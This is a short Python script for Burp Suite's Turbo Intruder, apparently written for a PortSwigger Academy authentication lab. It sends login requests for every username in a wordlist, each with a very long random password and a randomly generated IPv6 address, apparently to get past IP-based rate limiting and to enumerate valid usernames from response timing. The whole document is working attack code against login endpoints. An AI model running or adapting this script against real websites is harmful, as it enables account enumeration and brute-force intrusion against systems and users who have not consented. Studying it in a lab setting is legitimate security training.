import random
import string

usernames = []
with open("$HOME/Documents/Python/PortswiggerAcademyLabs/Authentication/username.txt", "r") as f:
    usernames = [x.strip() for x in f.readlines()]

char_list = string.ascii_letters + string.digits
password = ''.join([random.choice(char_list) for _ in range(501)])

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=500,
                           pipeline=False,
                           engine=Engine.THREADED,
                           timeout=20
                           )

    ip_char_list = '12344567890ABCDEF'

    for username in usernames:
        ip = '{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}'.format(*[random.choice(ip_char_list) for _ in range(33)])
        engine.queue(target.req, [ip, username, password], label=username)




def handleResponse(req, interesting):
    table.add(req)
